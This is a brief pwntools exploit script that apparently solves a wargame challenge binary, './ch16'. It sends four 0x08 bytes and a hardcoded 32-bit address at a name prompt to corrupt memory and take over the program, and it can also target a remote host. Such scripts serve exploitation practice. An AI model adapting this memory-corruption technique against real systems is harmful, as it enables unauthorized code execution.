from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./ch16"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = start()

padding = 4

payload = flat(
    padding * b'\x08',
    p32(0xbffffabc)
)

io.sendlineafter(b"name:",payload)

io.interactive()